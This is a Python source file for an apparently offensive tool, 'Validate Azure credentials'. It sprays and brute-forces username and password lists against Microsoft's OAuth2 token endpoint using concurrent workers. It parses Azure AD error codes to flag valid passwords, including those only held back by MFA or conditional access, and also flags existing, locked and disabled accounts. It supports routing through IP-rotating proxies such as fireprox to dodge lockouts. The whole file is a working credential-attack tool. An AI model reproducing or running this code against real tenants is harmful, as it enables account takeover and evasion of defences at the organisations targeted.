import argparse
import sys
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from . import read_in
import logging
import requests

logger = logging.getLogger("aze")

def parse_args():
    parser = argparse.ArgumentParser(
        description="Validate Azure credentials.",
    )
    parser.add_argument(
        "creds",
        nargs="*",
        help="Specify several user:password records. If none stdin will be used",
    )

    parser.add_argument(
        "-u", "--user", "--users",
        nargs="*",
        help="Specify usernames. If - then stdin will be used to read usernames.",
    )

    parser.add_argument(
        "-p", "--password", "--passwords",
        nargs="*",
        help="Specify passwords. If - then stdin will be used to read passwords.",
    )

    parser.add_argument(
        "-x", "--useraspassword",
        action="store_true",
        help="Use usernames as passwords",
    )

    parser.add_argument(
        "-d", "--domain",
        help="Domain of the user accounts."\
        "If specified, usernames are not required to have domain.",
    )

    parser.add_argument(
        "-w", "--workers",
        default=1,
        type=int,
        help="Number of concurrent workers."
    )

    parser.add_argument(
        "--base-url",
        default="https://login.microsoft.com",
        help="The url without path to request."
        "Change for using solutions like fireprox",
    )

    parser.add_argument(
        "--verbose",
        "-v",
        action="count",
        help="Verbosity",
        default=0
    )

    return parser.parse_args()

def main():
    args = parse_args()
    init_log(args.verbose)

    state = AzureBruteState()
    pool = ThreadPoolExecutor(args.workers)
    threads = []

    pairs = args.creds
    users = args.user
    passwords = args.password
    sameuseraspassword = args.useraspassword
    domain = args.domain
    base_url = args.base_url

    for user, password in gen_creds(
            domain, pairs, users, passwords, sameuseraspassword
    ):
            t = pool.submit(
                _handle_user_password, state, base_url, user, password
            )
            threads.append(t)

    for f in as_completed(threads):
        try:
            f.result()
        except Exception as ex:
            logging.warning(
                'Error trying %s:%s %s', ex.user, ex.password, ex
            )
            raise ex

def init_log(verbosity=0, log_file=None):

    if verbosity == 1:
        level = logging.INFO
    elif verbosity > 1:
        level = logging.DEBUG
    else:
        level = logging.WARN

    logging.basicConfig(
        level=level,
        filename=log_file,
        format="%(levelname)s:%(message)s"
    )


def gen_creds(domain, pairs, users, passwords, sameuseraspassword):
    if users:
        users = list(read_in.read_text_targets(
            users, use_stdin_if_none=False
        ))
        if sameuseraspassword:
            for username in users:
                password = username
                yield join_user_domain(username, domain), password

        passwords = list(read_in.read_text_targets(
            passwords, use_stdin_if_none=False
        ))
        for username in users:
            for password in passwords:
                yield join_user_domain(username, domain), password
    else:
        yield from gen_creds_from_pairs(domain, pairs)

def gen_creds_from_pairs(domain, pairs):
    for cred in read_in.read_text_targets(pairs):
        try:
            username, password = cred.split(":", 1)
        except ValueError:
            logging.warning("Invalid user:pass: %s", cred)
            continue

        yield join_user_domain(username, domain), password

def join_user_domain(username, domain):
    if not "@" in username and domain:
        username += "@" + domain
    return username


class AzureBruteState:
    def __init__(self):
        self.valid_credentials = {}
        self.valid_users = set()
        self.invalid_users = set()
        self.locked_users = set()
        self.disabled_users = set()
        self.report_lock = Lock()

    def add_valid_user(self, user):
        self.valid_users.add(user)

    def add_invalid_user(self, user):
        self.invalid_users.add(user)

    def add_locked_user(self, user):
        self.locked_users.add(user)

    def add_disabled_user(self, user):
        self.disabled_users.add(user)

    def add_valid_credentials(self, user, password):
        self.valid_credentials[user] = password

    def were_user_credentials_discovered(self, user):
        return user in self.valid_credentials

    def is_valid_user(self, user):
        return user in self.valid_users

    def is_invalid_user(self, user):
        return user in self.invalid_users

    def is_locked_user(self, user):
        return user in self.locked_users

    def is_disabled_user(self, user):
        return user in self.disabled_users

def _handle_user_password(state, base_url, user, password):
    try:
        if state.were_user_credentials_discovered(user)\
           or state.is_invalid_user(user)\
           or state.is_locked_user(user)\
           or state.is_disabled_user(user):
            return
        _check_user_password(state, base_url, user, password)
    except Exception as ex:
        ex.user = user
        ex.password = password
        raise ex

ERROR_INVALID_USER_OR_PASSWORD = 50126
ERROR_USER_NOT_EXISTS_IN_TENANT = 50034
ERROR_UNABLE_TO_FOUND_TENANT1 = 50128
ERROR_UNABLE_TO_FOUND_TENANT2 = 50059
ERROR_ENROLL_IN_MFA_REQUIRED = 50079
ERROR_MFA_REQUIRED = 50076
ERROR_EXTERNAL_SECURITY_CHALLENGE = 50158
ERROR_LOCKED_ACCOUNT = 50053
ERROR_DISABLED_ACCOUNT = 50057
ERROR_EXPIRED_PASSWORD = 50055
ERROR_INVALID_RESOURCE = 500011
ERROR_ACCESS_DENIED_BY_CONDITIONAL_ACCESS_POLICY = 53003

def _check_user_password(state, base_url, user, password):
    error_code, description = login_with_user_password(
        base_url, user, password
    )

    if error_code == 0\
       or error_code == ERROR_INVALID_RESOURCE:
        _report_valid_password(state, user, password, "")
    elif error_code == ERROR_INVALID_USER_OR_PASSWORD:
        # invalid password
        _report_valid_user(state, user)

    elif error_code == ERROR_UNABLE_TO_FOUND_TENANT1 \
         or error_code == ERROR_UNABLE_TO_FOUND_TENANT2\
         or error_code == ERROR_USER_NOT_EXISTS_IN_TENANT:
        _report_invalid_user(state, user, description)

    elif error_code == ERROR_ENROLL_IN_MFA_REQUIRED\
         or error_code == ERROR_MFA_REQUIRED:
        _report_valid_password(state, user, password, "MFA")

    elif error_code == ERROR_EXTERNAL_SECURITY_CHALLENGE:
        _report_valid_password(state, user, password, "External MFA")

    elif error_code == ERROR_ACCESS_DENIED_BY_CONDITIONAL_ACCESS_POLICY:
        _report_valid_password(
            state, user, password, "Conditional Access Policy"
        )

    elif error_code == ERROR_EXPIRED_PASSWORD:
        # expired password
        report_valid_password(state, user, password, "Expired")

    elif error_code == ERROR_LOCKED_ACCOUNT:
        # locked account: By too many sign-in attemps
        #                 or malicious IP address
        _report_locked_user(state, user)

    elif error_code == ERROR_DISABLED_ACCOUNT:
        # disabled account
        _report_disabled_user(state, user)

    else:
        logging.warning(
            "Unknown error code %d testing %s:%s : %s",
            error_code, user, password, description
        )

def lock_report(func):
    def wrapper_decorator(state, *args, **kwargs):
        with state.report_lock:
            return func(state, *args, **kwargs)

    return wrapper_decorator

@lock_report
def _report_valid_password(state, user, password, restriction):
    state.add_valid_credentials(user, password)
    print('%s:%s:%s' % (restriction, user, password))

@lock_report
def _report_invalid_user(state, user, description):
    if state.is_invalid_user(user):
        return
    state.add_invalid_user(user)
    logging.debug('Invalid user %s : %s', user, description)

@lock_report
def _report_valid_user(state, user):
    if state.is_valid_user(user):
        return
    state.add_valid_user(user)
    print(":{}:".format(user))

@lock_report
def _report_locked_user(state, user):
    if state.is_locked_user(user):
        return
    state.add_locked_user(user)
    logging.warning('Locked user => %s', user)

@lock_report
def _report_disabled_user(state, user):
    if state.is_disabled_user(user):
        return
    state.add_disabled_user(user)
    print("Disabled:{}:".format(user))


def login_with_user_password(base_url, user, password):
    data = {
        'resource': 'https://graph.microsoft.com',
        'client_id': '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
        'client_info': '1',
        'grant_type': 'password',
        'username': user,
        'password': password,
        'scope': 'openid'
    }
    headers = {
        'Accept': 'application/json',
    }

    url = "{}/common/oauth2/token".format(base_url)
    logging.debug('Trying %s:%s' % (user, password))
    resp = requests.post(url, data=data, headers=headers)
    if resp.status_code == 200:
        error_code = 0
        description = ""
    else:
        body_obj = resp.json()
        error_code = body_obj["error_codes"][0]
        description = body_obj["error_description"]

    return error_code, description
